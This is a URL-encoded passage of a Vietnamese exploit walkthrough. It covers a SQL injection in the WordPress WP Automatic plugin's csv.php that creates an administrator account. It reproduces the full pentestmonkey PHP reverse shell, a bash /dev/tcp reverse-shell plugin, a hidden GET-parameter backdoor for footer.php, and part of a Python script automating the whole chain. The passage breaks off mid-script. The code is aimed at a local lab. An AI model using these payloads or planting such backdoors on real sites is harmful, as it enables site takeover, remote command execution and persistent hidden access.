oc%60%20v%E1%BB%ABa%20t%E1%BA%A1o%0A%0A%60%60%60sql!%0ASELECT%20*%20FROM%20%60wp_users%60%20WHERE%20user_login%3D'poc'%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH1l7SD1GR.png)%0A%0A%3D%3E%20User%20%C4%91%C3%A3%20t%E1%BB%93n%20t%E1%BA%A1i%20trong%20h%E1%BB%87%20th%E1%BB%91ng%0A%0A%23%23%23%20X%C3%A1c%20%C4%91%E1%BB%8Bnh%20user%20id%0A%0A%60%60%60sql!%0ASELECT%20*%20FROM%20%60wp_users%60%20WHERE%20user_login%3D'poc'%20and%20ID%3D1%0A%60%60%60%0A%0ABrute%20force%20gi%C3%A1%20tr%E1%BB%8B%20ID%20%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJbpSPJz0.png)%0A%0AT%C3%ACm%20%C4%91%C6%B0%E1%BB%A3c%20ID%3D2%0A%0A%23%23%23%20Th%C3%AAm%20quy%E1%BB%81n%20admin%20cho%20user%20v%E1%BB%ABa%20t%E1%BA%A1o%0A%0AUser%20v%E1%BB%ABa%20t%E1%BA%A1o%20hi%E1%BB%87n%20t%E1%BA%A1i%20ch%C6%B0a%20%C4%91%C6%B0%E1%BB%A3c%20g%C3%A1n%20quy%E1%BB%81n%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSkCj8wkMC.png)%0A%0AC%C3%A2u%20truy%20v%E1%BA%A5n%20%C4%91%E1%BB%83%20th%C3%AAm%20quy%E1%BB%81n%20admin%20cho%20user%20d%E1%BB%B1a%20tr%C3%AAn%20user_id%0A%0A%60%60%60sql!%0AINSERT%20INTO%20wp_usermeta%20(user_id%2C%20meta_key%2C%20meta_value)%20VALUES%20(2%2C%20'wp_capabilities'%2C%20'a%3A1%3A%7Bs%3A13%3A%22administrator%22%3Bb%3A1%3B%7D')%2C%20(2%2C%20'wp_user_level'%2C%20'10')%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkE-DPyzR.png)%0A%0AK%E1%BA%BFt%20qu%E1%BA%A3%20user%20%60poc%60%20%C4%91%C3%A3%20c%C3%B3%20quy%E1%BB%81n%20admin%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FB1qIPvyGR.png)%0A%0A%23%23%20Upload%20reverse%20shell%0A%0APHP%20reverse%20shell%20c%E1%BB%A7a%20%5Bpentestmonkey%5D(https%3A%2F%2Fgithub.com%2Fpentestmonkey%2Fphp-reverse-shell%2Fblob%2Fmaster%2Fphp-reverse-shell.php)%3A%0A%0A%60%60%60php%3D%0A%3C%3Fphp%0A%2F%2F%20php-reverse-shell%20-%20A%20Reverse%20Shell%20implementation%20in%20PHP%0A%2F%2F%20Copyright%20(C)%202007%20pentestmonkey%40pentestmonkey.net%0A%2F%2F%0A%2F%2F%20This%20tool%20may%20be%20used%20for%20legal%20purposes%20only.%20%20Users%20take%20full%20responsibility%0A%2F%2F%20for%20any%20actions%20performed%20using%20this%20tool.%20%20The%20author%20accepts%20no%20liability%0A%2F%2F%20for%20damage%20caused%20by%20this%20tool.%20%20If%20these%20terms%20are%20not%20acceptable%20to%20you%2C%20then%0A%2F%2F%20do%20not%20use%20this%20tool.%0A%2F%2F%0A%2F%2F%20In%20all%20other%20respects%20the%20GPL%20version%202%20applies%3A%0A%2F%2F%0A%2F%2F%20This%20program%20is%20free%20software%3B%20you%20can%20redistribute%20it%20and%2For%20modify%0A%2F%2F%20it%20under%20the%20terms%20of%20the%20GNU%20General%20Public%20License%20version%202%20as%0A%2F%2F%20published%20by%20the%20Free%20Software%20Foundation.%0A%2F%2F%0A%2F%2F%20This%20program%20is%20distributed%20in%20the%20hope%20that%20it%20will%20be%20useful%2C%0A%2F%2F%20but%20WITHOUT%20ANY%20WARRANTY%3B%20without%20even%20the%20implied%20warranty%20of%0A%2F%2F%20MERCHANTABILITY%20or%20FITNESS%20FOR%20A%20PARTICULAR%20PURPOSE.%20%20See%20the%0A%2F%2F%20GNU%20General%20Public%20License%20for%20more%20details.%0A%2F%2F%0A%2F%2F%20You%20should%20have%20received%20a%20copy%20of%20the%20GNU%20General%20Public%20License%20along%0A%2F%2F%20with%20this%20program%3B%20if%20not%2C%20write%20to%20the%20Free%20Software%20Foundation%2C%20Inc.%2C%0A%2F%2F%2051%20Franklin%20Street%2C%20Fifth%20Floor%2C%20Boston%2C%20MA%2002110-1301%20USA.%0A%2F%2F%0A%2F%2F%20This%20tool%20may%20be%20used%20for%20legal%20purposes%20only.%20%20Users%20take%20full%20responsibility%0A%2F%2F%20for%20any%20actions%20performed%20using%20this%20tool.%20%20If%20these%20terms%20are%20not%20acceptable%20to%0A%2F%2F%20you%2C%20then%20do%20not%20use%20this%20tool.%0A%2F%2F%0A%2F%2F%20You%20are%20encouraged%20to%20send%20comments%2C%20improvements%20or%20suggestions%20to%0A%2F%2F%20me%20at%20pentestmonkey%40pentestmonkey.net%0A%2F%2F%0A%2F%2F%20Description%0A%2F%2F%20-----------%0A%2F%2F%20This%20script%20will%20make%20an%20outbound%20TCP%20connection%20to%20a%20hardcoded%20IP%20and%20port.%0A%2F%2F%20The%20recipient%20will%20be%20given%20a%20shell%20running%20as%20the%20current%20user%20(apache%20normally).%0A%2F%2F%0A%2F%2F%20Limitations%0A%2F%2F%20-----------%0A%2F%2F%20proc_open%20and%20stream_set_blocking%20require%20PHP%20version%204.3%2B%2C%20or%205%2B%0A%2F%2F%20Use%20of%20stream_select()%20on%20file%20descriptors%20returned%20by%20proc_open()%20will%20fail%20and%20return%20FALSE%20under%20Windows.%0A%2F%2F%20Some%20compile-time%20options%20are%20needed%20for%20daemonisation%20(like%20pcntl%2C%20posix).%20%20These%20are%20rarely%20available.%0A%2F%2F%0A%2F%2F%20Usage%0A%2F%2F%20-----%0A%2F%2F%20See%20http%3A%2F%2Fpentestmonkey.net%2Ftools%2Fphp-reverse-shell%20if%20you%20get%20stuck.%0A%0Aset_time_limit%20(0)%3B%0A%24VERSION%20%3D%20%221.0%22%3B%0A%24ip%20%3D%20'127.0.0.1'%3B%20%20%2F%2F%20CHANGE%20THIS%0A%24port%20%3D%201414%3B%20%20%20%20%20%20%20%2F%2F%20CHANGE%20THIS%0A%24chunk_size%20%3D%201400%3B%0A%24write_a%20%3D%20null%3B%0A%24error_a%20%3D%20null%3B%0A%24shell%20%3D%20'uname%20-a%3B%20w%3B%20id%3B%20%2Fbin%2Fsh%20-i'%3B%0A%24daemon%20%3D%200%3B%0A%24debug%20%3D%200%3B%0A%0A%2F%2F%0A%2F%2F%20Daemonise%20ourself%20if%20possible%20to%20avoid%20zombies%20later%0A%2F%2F%0A%0A%2F%2F%20pcntl_fork%20is%20hardly%20ever%20available%2C%20but%20will%20allow%20us%20to%20daemonise%0A%2F%2F%20our%20php%20process%20and%20avoid%20zombies.%20%20Worth%20a%20try...%0Aif%20(function_exists('pcntl_fork'))%20%7B%0A%09%2F%2F%20Fork%20and%20have%20the%20parent%20process%20exit%0A%09%24pid%20%3D%20pcntl_fork()%3B%0A%09%0A%09if%20(%24pid%20%3D%3D%20-1)%20%7B%0A%09%09printit(%22ERROR%3A%20Can't%20fork%22)%3B%0A%09%09exit(1)%3B%0A%09%7D%0A%09%0A%09if%20(%24pid)%20%7B%0A%09%09exit(0)%3B%20%20%2F%2F%20Parent%20exits%0A%09%7D%0A%0A%09%2F%2F%20Make%20the%20current%20process%20a%20session%20leader%0A%09%2F%2F%20Will%20only%20succeed%20if%20we%20forked%0A%09if%20(posix_setsid()%20%3D%3D%20-1)%20%7B%0A%09%09printit(%22Error%3A%20Can't%20setsid()%22)%3B%0A%09%09exit(1)%3B%0A%09%7D%0A%0A%09%24daemon%20%3D%201%3B%0A%7D%20else%20%7B%0A%09printit(%22WARNING%3A%20Failed%20to%20daemonise.%20%20This%20is%20quite%20common%20and%20not%20fatal.%22)%3B%0A%7D%0A%0A%2F%2F%20Change%20to%20a%20safe%20directory%0Achdir(%22%2F%22)%3B%0A%0A%2F%2F%20Remove%20any%20umask%20we%20inherited%0Aumask(0)%3B%0A%0A%2F%2F%0A%2F%2F%20Do%20the%20reverse%20shell...%0A%2F%2F%0A%0A%2F%2F%20Open%20reverse%20connection%0A%24sock%20%3D%20fsockopen(%24ip%2C%20%24port%2C%20%24errno%2C%20%24errstr%2C%2030)%3B%0Aif%20(!%24sock)%20%7B%0A%09printit(%22%24errstr%20(%24errno)%22)%3B%0A%09exit(1)%3B%0A%7D%0A%0A%2F%2F%20Spawn%20shell%20process%0A%24descriptorspec%20%3D%20array(%0A%20%20%200%20%3D%3E%20array(%22pipe%22%2C%20%22r%22)%2C%20%20%2F%2F%20stdin%20is%20a%20pipe%20that%20the%20child%20will%20read%20from%0A%20%20%201%20%3D%3E%20array(%22pipe%22%2C%20%22w%22)%2C%20%20%2F%2F%20stdout%20is%20a%20pipe%20that%20the%20child%20will%20write%20to%0A%20%20%202%20%3D%3E%20array(%22pipe%22%2C%20%22w%22)%20%20%20%2F%2F%20stderr%20is%20a%20pipe%20that%20the%20child%20will%20write%20to%0A)%3B%0A%0A%24process%20%3D%20proc_open(%24shell%2C%20%24descriptorspec%2C%20%24pipes)%3B%0A%0Aif%20(!is_resource(%24process))%20%7B%0A%09printit(%22ERROR%3A%20Can't%20spawn%20shell%22)%3B%0A%09exit(1)%3B%0A%7D%0A%0A%2F%2F%20Set%20everything%20to%20non-blocking%0A%2F%2F%20Reason%3A%20Occsionally%20reads%20will%20block%2C%20even%20though%20stream_select%20tells%20us%20they%20won't%0Astream_set_blocking(%24pipes%5B0%5D%2C%200)%3B%0Astream_set_blocking(%24pipes%5B1%5D%2C%200)%3B%0Astream_set_blocking(%24pipes%5B2%5D%2C%200)%3B%0Astream_set_blocking(%24sock%2C%200)%3B%0A%0Aprintit(%22Successfully%20opened%20reverse%20shell%20to%20%24ip%3A%24port%22)%3B%0A%0Awhile%20(1)%20%7B%0A%09%2F%2F%20Check%20for%20end%20of%20TCP%20connection%0A%09if%20(feof(%24sock))%20%7B%0A%09%09printit(%22ERROR%3A%20Shell%20connection%20terminated%22)%3B%0A%09%09break%3B%0A%09%7D%0A%0A%09%2F%2F%20Check%20for%20end%20of%20STDOUT%0A%09if%20(feof(%24pipes%5B1%5D))%20%7B%0A%09%09printit(%22ERROR%3A%20Shell%20process%20terminated%22)%3B%0A%09%09break%3B%0A%09%7D%0A%0A%09%2F%2F%20Wait%20until%20a%20command%20is%20end%20down%20%24sock%2C%20or%20some%0A%09%2F%2F%20command%20output%20is%20available%20on%20STDOUT%20or%20STDERR%0A%09%24read_a%20%3D%20array(%24sock%2C%20%24pipes%5B1%5D%2C%20%24pipes%5B2%5D)%3B%0A%09%24num_changed_sockets%20%3D%20stream_select(%24read_a%2C%20%24write_a%2C%20%24error_a%2C%20null)%3B%0A%0A%09%2F%2F%20If%20we%20can%20read%20from%20the%20TCP%20socket%2C%20send%0A%09%2F%2F%20data%20to%20process's%20STDIN%0A%09if%20(in_array(%24sock%2C%20%24read_a))%20%7B%0A%09%09if%20(%24debug)%20printit(%22SOCK%20READ%22)%3B%0A%09%09%24input%20%3D%20fread(%24sock%2C%20%24chunk_size)%3B%0A%09%09if%20(%24debug)%20printit(%22SOCK%3A%20%24input%22)%3B%0A%09%09fwrite(%24pipes%5B0%5D%2C%20%24input)%3B%0A%09%7D%0A%0A%09%2F%2F%20If%20we%20can%20read%20from%20the%20process's%20STDOUT%0A%09%2F%2F%20send%20data%20down%20tcp%20connection%0A%09if%20(in_array(%24pipes%5B1%5D%2C%20%24read_a))%20%7B%0A%09%09if%20(%24debug)%20printit(%22STDOUT%20READ%22)%3B%0A%09%09%24input%20%3D%20fread(%24pipes%5B1%5D%2C%20%24chunk_size)%3B%0A%09%09if%20(%24debug)%20printit(%22STDOUT%3A%20%24input%22)%3B%0A%09%09fwrite(%24sock%2C%20%24input)%3B%0A%09%7D%0A%0A%09%2F%2F%20If%20we%20can%20read%20from%20the%20process's%20STDERR%0A%09%2F%2F%20send%20data%20down%20tcp%20connection%0A%09if%20(in_array(%24pipes%5B2%5D%2C%20%24read_a))%20%7B%0A%09%09if%20(%24debug)%20printit(%22STDERR%20READ%22)%3B%0A%09%09%24input%20%3D%20fread(%24pipes%5B2%5D%2C%20%24chunk_size)%3B%0A%09%09if%20(%24debug)%20printit(%22STDERR%3A%20%24input%22)%3B%0A%09%09fwrite(%24sock%2C%20%24input)%3B%0A%09%7D%0A%7D%0A%0Afclose(%24sock)%3B%0Afclose(%24pipes%5B0%5D)%3B%0Afclose(%24pipes%5B1%5D)%3B%0Afclose(%24pipes%5B2%5D)%3B%0Aproc_close(%24process)%3B%0A%0A%2F%2F%20Like%20print%2C%20but%20does%20nothing%20if%20we've%20daemonised%20ourself%0A%2F%2F%20(I%20can't%20figure%20out%20how%20to%20redirect%20STDOUT%20like%20a%20proper%20daemon)%0Afunction%20printit%20(%24string)%20%7B%0A%09if%20(!%24daemon)%20%7B%0A%09%09print%20%22%24string%5Cn%22%3B%0A%09%7D%0A%7D%0A%0A%3F%3E%20%0A%60%60%60%0A%0A%23%23%23%20Upload%20plugin%20or%20template%0A%0AT%E1%BA%A3i%20m%E1%BB%99t%20plugin%20b%E1%BA%A5t%20k%E1%BB%B3%20v%E1%BB%81%20m%C3%A1y%2C%20%E1%BB%9F%20%C4%91%C3%A2y%20m%C3%ACnh%20ch%E1%BB%8Dn%20plugin%20classic-editor%2C%20unzip%20v%C3%A0%20th%C3%AAm%20file%20%60reverse-php-shell.php%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJKNGcJzR.png)%0A%0AZip%20l%E1%BA%A1i%20v%C3%A0%20upload%20plugin%20l%C3%AAn%20server%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1LkQqyz0.png)%0A%0AM%E1%BB%9F%20terminal%20tr%C3%AAn%20m%C3%A1y%20l%C3%AAn%2C%20%E1%BB%9F%20%C4%91%C3%A2y%20m%C3%ACnh%20s%E1%BB%AD%20d%E1%BB%A5ng%20MacOS%20n%C3%AAn%20c%C3%A2u%20l%E1%BB%87nh%20netcat%20listener%20%C4%91%E1%BB%83%20b%E1%BA%AFt%20reverse%20shell%20c%E1%BB%A7a%20m%C3%ACnh%20tr%C3%B4ng%20nh%C6%B0%20sau%3A%0A%0A%60%60%60%0Anc%20-lk%201414%0A%60%60%60%0A%0ASau%20khi%20upload%20th%C3%A0nh%20c%C3%B4ng%20v%C3%A0%20b%E1%BA%ADt%20netcat%20listener%20th%C3%AC%20ta%20c%C3%B3%20th%E1%BB%83%20truy%20c%E1%BA%ADp%20%C4%91%E1%BA%BFn%20file%20theo%20%C4%91%C6%B0%E1%BB%9Dng%20d%E1%BA%ABn%20sau%0A%0A%60%60%60%0A%2Fwp-content%2Fplugins%2Fclassic-editor%2Freverse-php-shell.php%0A%60%60%60%0A%0AL%C3%BAc%20n%C3%A0y%20file%20PHP%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20th%E1%BB%B1c%20thi%20v%C3%A0%20g%E1%BB%ADi%20shell%20t%E1%BB%9Bi%20IP%20v%C3%A0%20port%20c%E1%BB%A7a%20m%C3%A1y%20hacker%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJ31HqJGC.png)%0A%0A%23%23%23%20Plugin%20file%20editor%20or%20Theme%20file%20editor%0A%0AD%C3%B9ng%20ch%E1%BB%A9c%20editor%20%C4%91%E1%BB%83%20ch%E1%BB%89nh%20s%E1%BB%ADa%20file%20b%E1%BA%A5t%20k%E1%BB%B3%20c%C3%B3%20s%E1%BA%B5n%20trong%20wordpress%2C%20%E1%BB%9F%20%C4%91%C3%A2y%20c%C3%B3%20th%E1%BB%83%20ch%E1%BB%89nh%20s%E1%BB%ADa%20%60footer.php%60%20c%E1%BB%A7a%20template%20hi%E1%BB%87n%20t%E1%BA%A1i%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkpt3_lfR.png)%0A%0ATa%20c%C3%B3%20th%E1%BB%83%20copy%20n%E1%BB%99i%20dung%20c%E1%BB%A7a%20file%20%60reverse-php-shell.php%60%20paste%20v%C3%A0o%20%60footer.php%60.%20B%E1%BA%ADt%20netcat%20listener%2C%20sau%20%C4%91%C3%B3%20ch%E1%BB%8Dn%20Update%20File%0A%0AQuan%20s%C3%A1t%20th%E1%BA%A5y%20tr%C3%AAn%20terminal%20%C4%91%C3%A3%20nh%E1%BA%ADn%20%C4%91%C6%B0%E1%BB%A3c%20shell%20g%E1%BB%ADi%20v%E1%BB%81%20t%E1%BB%AB%20file%20%60footer.php%60.%20%0A%0AVi%E1%BB%87c%20b%E1%BB%8F%20payload%20v%C3%A0o%20file%20%60footer.php%60%20s%E1%BA%BD%20gi%C3%BAp%20shell%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%ADi%20v%E1%BB%81%20m%E1%BB%97i%20khi%20file%20%60footer.php%60%20%C4%91%C6%B0%E1%BB%A3c%20load.%20%C4%90%E1%BB%93ng%20th%E1%BB%9Di%20s%E1%BA%BD%20g%C3%A2y%20ch%C3%BA%20%C3%BD%20h%C6%A1n%20nhi%E1%BB%81u%20v%C3%AC%20trang%20web%20s%E1%BA%BD%20%C4%91%E1%BB%A3i%20khi%20n%C3%A0o%20interactive%20shell%20k%E1%BA%BFt%20th%C3%BAc%20m%E1%BB%9Bi%20tr%E1%BA%A3%20v%E1%BB%81%20trang%20web%20cho%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng.%20%3D%3E%20N%C3%AAn%20d%C3%B9ng%20shell%20n%C3%A0y%20%C4%91%E1%BB%83%20upload%20m%E1%BB%99t%20shell%20kh%C3%A1c%20%E1%BA%A9n%20h%C6%A1n%0A%0A%23%23%23%20T%E1%BB%B1%20t%E1%BA%A1o%20m%E1%BB%99t%20plugin%20reverse%20shell%0A%0A%60%60%60php%3D%0A%3C%3Fphp%0A%2F**%0A*%20Plugin%20Name%3A%20Reverse%20Shell%20Plugin%0A*%20Plugin%20URI%3A%0A*%20Description%3A%20Reverse%20Shell%20Plugin%0A*%20Version%3A%201.0%0A*%20Author%3A%20Vince%20Matteo%0A*%20Author%20URI%3A%20http%3A%2F%2Fwww.sevenlayers.com%0A*%2F%0A%0Aexec(%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F1414%200%3E%261'%22)%3B%0A%60%60%60%0A%0A%C4%90%E1%BB%83%20bi%E1%BA%BFn%20file%20%60reverse-php-shell.php%60%20th%C3%A0nh%20m%E1%BB%99t%20plugin%20ta%20c%E1%BA%A7n%20th%C3%AAm%20v%C3%A0o%20%C4%91%E1%BA%A7u%20file%20m%E1%BB%99t%20v%C3%A0i%20d%C3%B2ng%20comment.%20Sau%20%C4%91%C3%B3%20zip%20file%20l%E1%BA%A1i%20v%C3%A0%20upload%20plugin.%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBy8OHFgf0.png)%0A%0AUpload%20th%C3%A0nh%20c%C3%B4ng%20th%C3%AC%20b%E1%BA%ADt%20netcat%20listener%2C%20sau%20%C4%91%C3%B3%20ch%E1%BB%8Dn%20activate%20plugin.%0A%0AQuan%20s%C3%A1t%20th%E1%BA%A5y%20shell%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%ADi%20v%E1%BB%81.%20Plugin%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20activate%20n%C3%AAn%20b%E1%BA%A5t%20c%E1%BB%A9%20khi%20n%C3%A0o%20trang%20web%20%C4%91%C6%B0%E1%BB%A3c%20load%2C%20shell%20c%C5%A9ng%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%ADi%20v%E1%BB%81%20cho%20hacker.%20%C4%90%E1%BB%93ng%20th%E1%BB%9Di%20s%E1%BA%BD%20g%C3%A2y%20ch%C3%BA%20%C3%BD%20h%C6%A1n%20nhi%E1%BB%81u%20v%C3%AC%20trang%20web%20s%E1%BA%BD%20%C4%91%E1%BB%A3i%20khi%20n%C3%A0o%20interactive%20shell%20k%E1%BA%BFt%20th%C3%BAc%20m%E1%BB%9Bi%20tr%E1%BA%A3%20v%E1%BB%81%20trang%20web%20cho%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng.%20%3D%3E%20N%C3%AAn%20d%C3%B9ng%20shell%20n%C3%A0y%20%C4%91%E1%BB%83%20upload%20m%E1%BB%99t%20shell%20kh%C3%A1c%20%E1%BA%A9n%20h%C6%A1n%0A%0A%3A%3A%3Ainfo%0A%3Abulb%3A%20Ta%20c%C3%B3%20th%E1%BB%83%20d%C3%B9ng%20%C4%91o%E1%BA%A1n%20m%C3%A3%20nh%C6%B0%20sau%3A%0A%0A%60%60%60php!%0Aif%20(isset(%24_GET%5B'shell'%5D))%20%7B%0A%20%20%20%20exec(%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F1414%200%3E%261'%22)%3B%0A%7D%0A%60%60%60%0A%0A%C4%91%E1%BB%83%20vi%E1%BB%87c%20g%E1%BB%ADi%20shell%20v%E1%BB%81%20m%C3%A1y%20hacker%20khi%20tham%20s%E1%BB%91%20%60shell%60%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%ADi%20cho%20server%0A%3A%3A%3A%0A%0A%23%23%20Script%20auto%20exploit%0A%0A%E1%BB%9E%20%C4%91%C3%A2y%20m%C3%ACnh%20s%E1%BA%BD%20vi%E1%BA%BFt%20m%E1%BB%99t%20%C4%91o%E1%BA%A1n%20script%20%C4%91%E1%BB%83%20th%E1%BB%B1c%20hi%E1%BB%87n%20t%E1%BA%A5t%20c%E1%BA%A3%20c%C3%A1c%20b%C6%B0%E1%BB%9Bc%20khai%20th%C3%A1c%20%E1%BB%9F%20tr%C3%AAn%20v%C3%A0%20tr%E1%BA%A3%20v%E1%BB%81%20interective%20shell%0A%0A1.%20Insert%20user%20m%E1%BB%9Bi%20(poc%3Apoc)%20v%C3%A0o%20database%20%0A2.%20N%C3%A2ng%20quy%E1%BB%81n%20user%20v%E1%BB%ABa%20t%E1%BA%A1o%20th%C3%A0nh%20Administrator%0A3.%20%C4%90%C4%83ng%20nh%E1%BA%ADp%20%0A4.%20S%E1%BB%AD%20d%E1%BB%A5ng%20ch%E1%BB%A9c%20n%C4%83ng%20ch%E1%BB%89nh%20s%E1%BB%ADa%20plugin%20%C4%91%E1%BB%83%20ch%E1%BB%89nh%20s%E1%BB%ADa%20file%20%60index.php%60%20trong%20plugin%20WP%20Automatic%20(l%C6%B0u%20%C3%BD%20ph%E1%BA%A3i%20ch%E1%BB%89nh%20s%E1%BB%ADa%20nh%E1%BB%AFng%20file%20c%C3%B3%20th%E1%BB%83%20truy%20c%E1%BA%ADp%20%C4%91%C6%B0%E1%BB%A3c%20m%C3%A0%20kh%C3%B4ng%20c%E1%BA%A7n%20%C4%91%C4%83ng%20nh%E1%BA%ADp)%0A5.%20Truy%20c%E1%BA%ADp%20%C4%91%E1%BA%BFn%20file%20%60index.php%60%20%C4%91%E1%BB%83%20k%C3%ADch%20ho%E1%BA%A1t%20reverse%20shell%0A%0A%0A%60%60%60python%3D%0Aimport%20requests%0Aimport%20hashlib%0A%0Adomain%20%3D%20%22http%3A%2F%2Flocalhost%3A80%2Fwordpress%22%0AlistenIP%20%3D%20%22127.0.0.1%22%0AlistenPort%20%3D%20%221415%22%0Awp_automatic_url%20%3D%20domain%20%2B%20%22%2Fwp-content%2Fplugins%2Fwp-automatic%2Finc%2Fcsv.php%22%0Aheaders%20%3D%20%7B%22User-Agent%22%3A%20%22Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A123.0)%20Gecko%2F20100101%20Firefox%2F123.0%22%2C%20%22Accept%22%3A%20%22text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Favif%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%22%2C%20%22Accept-Language%22%3A%20%22en-US%2Cen%3Bq%3D0.5%22%2C%20%22Accept-Encoding%22%3A%20%22gzip%2C%20deflate%2C%20br%22%2C%20%22Connection%22%3A%20%22close%22%2C%20%22Upgrade-Insecure-Requests%22%3A%20%2211%22%2C%20%22Content-Type%22%3A%20%22application%2Fx-www-form-urlencoded%22%7D%0A%0A%23%20INSERT%20new%20user%0Adata%20%3D%20%7B%22q%22%3A%20%22INSERT%20INTO%20wp_users%20(user_login%2C%20user_pass%2C%20user_nicename%2C%20user_email%2C%20user_registered%2C%20user_status)%20VALUES%20('poc'%2C%20MD5('poc')%2C%20'poc'%2C%20'poc%40localhost.org'%2C%20NOW()%2C%200)%22%2C%20%22auth%22%3A%20%22%20%22%2C%20%22integ%22%3A%20%222420edd07fd8ceb35f9393e40305f37c%22%7D%0Ar%20%3D%20requests.post(wp_automatic_url%2C%20headers%3Dheaders%2C%20data%3Ddata)%0A%0A%23Find%20ID%20of%20the%20user%20we%20just%20insert%2C%20change%20max%20if%20you%20think%20the%20ID%20is%20bigger%20than%2010%0Amax%20%3D%2010%0Afor%20id%20in%20range%20(0%2C%20max)%3A%0A%20%20%20%20data%5B%22q%22%5D%20%3D%20%22SELECT%20*%20FROM%20%60wp_users%60%20WHERE%20user_login%3D'poc'%20AND%20ID%3D%22%20%2B%20str(id)%0A%20%20%20%20data%5B%22integ%22%5D%20%3D%20hashlib.md5(data%5B%22q%22%5D.encode()).hexdigest()%0A%20%20%20%20response%20%3D%20requests.post(wp_automatic_url%2C%20headers%3Dheaders%2C%20data%3Ddata)%0A%20%20%20%20if%20%22%2C%2C%2C%22%20in%20response.text%3A%0A%20%20%20%20%20%20%20%20id%20%3D%20str(id)%0A%20%20%20%20%20%20%20%20break%0A%0A%23Add%20Role%20Administrator%20to%20the%20user%0Adata%5B%22q%22%5D%20%3D%20%22INSERT%20INTO%20wp_usermeta%20(user_id%2C%20meta_key%2C%20meta_value)%20VALUES%20(%22%20%2B%20id%20%2B%20%22%2C%20'wp_capabilities'%2C%20'a%3A1%3A%7Bs%3A13%3A%5C%22administrator%5C%22%3Bb%3A1%3B%7D')%2C%20(%22%20%2B%20id%20%2B%20%22%2C%20'wp_user_level'%2C%20'10')%22%0Adata%5B%22integ%22%5D%20%3D%20hashlib.md5(data%5B%22q%22%5D.encode()).hexdigest()%0Ar%20%3D%20requests.post(wp_automatic_url%2C%20headers%3Dheaders%2C%20data%3Ddata)%0A%0Aprint('Successfully%20add%20Administrator%20account%20poc%3Apoc')%0A%0A%23%20Login%20%0Alogin_url%20%3D%20domain%20%2B%20%22%2Fwp-login.php%22%0Aheaders%20%3D%20%7B%22User-Agent%22%3A%20%22Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A123.0)%20Gecko%2F20100101%20Firefox%2F123.0%22%2C%20%22Accept%22%3A%20%22text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Favif%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%22%2C%20%22Accept-Language%22%3A%20%22en-US%2Cen%3Bq%3D0.5%22%2C%20%22Accept-Encoding%22%3A%20%22gzip%2C%20deflate%2C%20br%22%2C%20%22Content-Type%22%3A%20%22application%2Fx-www-form-urlencoded%22%2C%20%22Origin%22%3A%20%22http%3A%2F%2Flocalhost%22%2C%20%22Connection%22%3A%20%22close%22%2C%20%22Upgrade-Insecure-Requests%22%3A%20%221%22%2C%20%22Sec-Fetch-Dest%22%3A%20%22document%22%2C%20%22Sec-Fetch-Mode%22%3A%20%22navigate%22%2C%20%22Sec-Fetch-Site%22%3A%20%22same-origin%22%2C%20%22Sec-Fetch-User%22%3A%20%22%3F1%22%7D%0Adata%20%3D%20%7B%22log%22%3A%20%22poc%22%2C%20%22pwd%22%3A%20%22poc%22%2C%20%22wp-submit%22%3A%20%22Log%20In%22%2C%20%22redirect_to%22%3A%20%22http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fusers.php%22%2C%20%22testcookie%22%3A%20%221%22%7D%0Asession%20%3D%20requests.session()%0Asession.post(login_url%2C%20headers%3Dheaders%2C%20data%3Ddata)%0A%0A%23%20I%20choose%20index.php%20in%20wp-automatic%20plugin%20to%20upload%20the%20shell%0A%23%20You%20can%20choose%20another%20file%20by%20changing%20the%20edit_wp_automatic_url%0A%23%20First%20we%20need%20to%20find%20the%20%60nonce%60%20%0Aedit_wp_automatic_url%20%3D%20domain%20%2B%20%22%2Fwp-admin%2Fplugin-editor.php%3Fplugin%3Dwp-automatic%252Findex.php%26Submit%3DSelect%22%0Aheaders%20%3D%20%7B%22User-Agent%22%3A%20%22Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A123.0)%20Gecko%2F20100101%20Firefox%2F123.0%22%2C%20%22Accept%22%3A%20%22text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Favif%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%22%2C%20%22Accept-Language%22%3A%20%22en-US%2Cen%3Bq%3D0.5%22%2C%20%22Accept-Encoding%22%3A%20%22gzip%2C%20deflate%2C%20br%22%2C%20%22Connection%22%3A%20%22close%22%2C%20%22Upgrade-Insecure-Requests%22%3A%20%